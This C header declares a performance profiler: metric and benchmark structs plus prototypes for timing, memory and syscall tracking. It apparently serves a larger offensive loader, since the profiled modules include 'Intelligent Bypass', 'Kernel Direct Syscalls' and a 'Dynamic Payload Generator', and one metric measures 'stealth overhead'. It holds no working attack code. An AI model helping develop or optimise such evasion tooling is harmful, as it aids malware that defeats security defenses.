#ifndef PERFORMANCE_PROFILER_H
#define PERFORMANCE_PROFILER_H

#include "common_defines.h"

// ========================================================================
// PERFORMANCE PROFILER v1.0 - "Ultimate Optimization Engine"
// "When performance meets perfection - the final boss of optimization" - Speed Demon
// ========================================================================

// Performance metric types
typedef enum _PERFORMANCE_METRIC_TYPE {
    METRIC_EXECUTION_TIME = 1,          // Execution time measurements
    METRIC_MEMORY_USAGE = 2,            // Memory consumption tracking
    METRIC_CPU_CYCLES = 3,              // CPU cycle counting
    METRIC_SYSCALL_FREQUENCY = 4,       // Syscall invocation frequency
    METRIC_GENERATION_SPEED = 5,        // Payload generation speed
    METRIC_STEALTH_OVERHEAD = 6,        // Stealth operation overhead
} PERFORMANCE_METRIC_TYPE;

// Module identifiers for profiling
typedef enum _PROFILED_MODULE {
    MODULE_CYNICAL_LOGGER = 1,          // Cynical Logger module
    MODULE_ENVIRONMENT_CHAMELEON = 2,   // Environment Chameleon module
    MODULE_INTELLIGENT_BYPASS = 3,      // Intelligent Bypass module
    MODULE_KERNEL_SYSCALLS = 4,         // Kernel Direct Syscalls module
    MODULE_DYNAMIC_GENERATOR = 5,       // Dynamic Payload Generator module
    MODULE_CORE_LOADER = 6,             // Core Loader module
} PROFILED_MODULE;

// Performance optimization levels
typedef enum _OPTIMIZATION_LEVEL {
    OPT_LEVEL_BALANCED = 1,             // Balanced optimization (default)
    OPT_LEVEL_AGGRESSIVE = 2,           // Aggressive optimization (speed focus)
    OPT_LEVEL_EXTREME = 3,              // Extreme optimization (maximum performance)
} OPTIMIZATION_LEVEL;

// Performance metric data
typedef struct _PERFORMANCE_METRIC {
    PERFORMANCE_METRIC_TYPE type;       // Type of metric
    PROFILED_MODULE module;             // Module being measured
    LARGE_INTEGER timestamp;            // Measurement timestamp
    LARGE_INTEGER start_time;           // Start time for duration metrics
    LARGE_INTEGER end_time;             // End time for duration metrics
    ULONGLONG value;                    // Metric value
    ULONGLONG accumulated_value;        // Accumulated value over time
    DWORD sample_count;                 // Number of samples taken
    ULONGLONG min_value;                // Minimum recorded value
    ULONGLONG max_value;                // Maximum recorded value
    BOOL is_active;                     // Is this metric currently being tracked?
} PERFORMANCE_METRIC, *PPERFORMANCE_METRIC;

// Performance benchmark results
typedef struct _BENCHMARK_RESULT {
    PROFILED_MODULE module;             // Module that was benchmarked
    DWORD test_iterations;              // Number of test iterations
    LARGE_INTEGER total_time;           // Total execution time
    LARGE_INTEGER average_time;         // Average execution time per iteration
    LARGE_INTEGER min_time;             // Minimum execution time
    LARGE_INTEGER max_time;             // Maximum execution time
    SIZE_T peak_memory_usage;           // Peak memory usage during benchmark
    DWORD optimization_score;           // Overall optimization score (1-100)
    BOOL benchmark_passed;              // Did the benchmark pass quality thresholds?
} BENCHMARK_RESULT, *PBENCHMARK_RESULT;

// Main performance profiler context
typedef struct _PERFORMANCE_PROFILER_CONTEXT {
    // Profiler state
    BOOL is_initialized;                // Profiler initialization state
    BOOL is_active;                     // Is profiling currently active?
    OPTIMIZATION_LEVEL opt_level;       // Current optimization level
    LARGE_INTEGER profiling_start_time; // When profiling started
    
    // Metrics tracking
    PERFORMANCE_METRIC metrics[32];     // Array of performance metrics
    DWORD active_metrics_count;         // Number of active metrics
    DWORD total_measurements;           // Total measurements taken
    
    // Benchmark results
    BENCHMARK_RESULT benchmark_results[8]; // Benchmark results for modules
    DWORD completed_benchmarks;         // Number of completed benchmarks
    
    // Configuration
    BOOL enable_realtime_optimization;  // Enable real-time optimization
    BOOL enable_memory_tracking;        // Enable detailed memory tracking
    DWORD measurement_interval_ms;      // Measurement interval in milliseconds
    DWORD optimization_threshold;       // Threshold for triggering optimizations
    
    // Statistics
    SIZE_T current_memory_usage;        // Current memory usage
    SIZE_T peak_memory_usage;           // Peak memory usage
    DWORD total_syscalls;               // Total system calls made
    DWORD direct_syscalls;              // Direct syscalls via kernel module
    LARGE_INTEGER total_execution_time; // Total execution time
} PERFORMANCE_PROFILER_CONTEXT, *PPERFORMANCE_PROFILER_CONTEXT;

// Global performance profiler context
extern PERFORMANCE_PROFILER_CONTEXT g_profiler_ctx;

// ========================================================================
// CORE PERFORMANCE PROFILER API - "The Optimization Command Center"
// ========================================================================

// Initialize performance profiler
BOOL PerformanceProfiler_Initialize(OPTIMIZATION_LEVEL opt_level);

// Start profiling a specific module
NTSTATUS PerformanceProfiler_StartProfiling(PROFILED_MODULE module);

// Stop profiling a specific module
NTSTATUS PerformanceProfiler_StopProfiling(PROFILED_MODULE module);

// Record a performance metric
NTSTATUS PerformanceProfiler_RecordMetric(
    PROFILED_MODULE module,
    PERFORMANCE_METRIC_TYPE metric_type,
    ULONGLONG value
);

// Start timing measurement
LARGE_INTEGER PerformanceProfiler_StartTiming(VOID);

// End timing measurement and record
NTSTATUS PerformanceProfiler_EndTiming(
    PROFILED_MODULE module,
    LARGE_INTEGER start_time,
    LPCSTR operation_name
);

// Cleanup performance profiler
VOID PerformanceProfiler_Cleanup(VOID);

// ========================================================================
// BENCHMARKING SYSTEM - "Performance Testing Arsenal"
// ========================================================================

// Run comprehensive benchmark for all modules
NTSTATUS Benchmark_RunComprehensive(VOID);

// Benchmark specific module
NTSTATUS Benchmark_Module(
    PROFILED_MODULE module,
    DWORD iterations,
    PBENCHMARK_RESULT result
);

// Benchmark payload generation performance
NTSTATUS Benchmark_PayloadGeneration(PBENCHMARK_RESULT result);

// Benchmark syscall performance
NTSTATUS Benchmark_SyscallPerformance(PBENCHMARK_RESULT result);

// Compare benchmark results
INT Benchmark_Compare(
    PBENCHMARK_RESULT result1,
    PBENCHMARK_RESULT result2
);

// ========================================================================
// RESOURCE MONITORING - "System Resource Surveillance"
// ========================================================================

// Update resource usage statistics
NTSTATUS ResourceMonitor_Update(VOID);

// Get current memory usage
SIZE_T ResourceMonitor_GetMemoryUsage(VOID);

// Track memory allocation
VOID ResourceMonitor_TrackAllocation(SIZE_T size, PVOID address);

// Track memory deallocation
VOID ResourceMonitor_TrackDeallocation(SIZE_T size, PVOID address);

// ========================================================================
// MODULE-SPECIFIC PROFILING - "Targeted Performance Analysis"
// ========================================================================

// Profile all modules
NTSTATUS ModuleProfiler_ProfileAll(VOID);

// Profile specific module
NTSTATUS ModuleProfiler_ProfileModule(
    PROFILED_MODULE module,
    PBENCHMARK_RESULT result
);

// ========================================================================
// PERFORMANCE REPORTING - "Intelligence Gathering"
// ========================================================================

// Generate comprehensive performance report
NTSTATUS PerformanceReporter_GenerateReport(VOID);

// ========================================================================
// LOGGING AND DIAGNOSTICS - "Performance Intelligence"
// ========================================================================

// Log performance metric
VOID PerformanceProfiler_LogMetric(
    PROFILED_MODULE module,
    PERFORMANCE_METRIC_TYPE metric_type,
    ULONGLONG value,
    LPCSTR context
);

// Log benchmark result
VOID PerformanceProfiler_LogBenchmark(
    PBENCHMARK_RESULT result,
    LPCSTR test_name
);

// Generate performance summary
VOID PerformanceProfiler_GenerateSummary(VOID);

// ========================================================================
// UTILITY FUNCTIONS - "Performance Helpers"
// ========================================================================

// Convert performance metric to string
LPCSTR PerformanceProfiler_MetricTypeToString(PERFORMANCE_METRIC_TYPE type);

// Convert module identifier to string
LPCSTR PerformanceProfiler_ModuleToString(PROFILED_MODULE module);

// Calculate performance score
DWORD PerformanceProfiler_CalculateScore(
    PPERFORMANCE_METRIC metrics,
    DWORD metric_count
);

#endif // PERFORMANCE_PROFILER_H 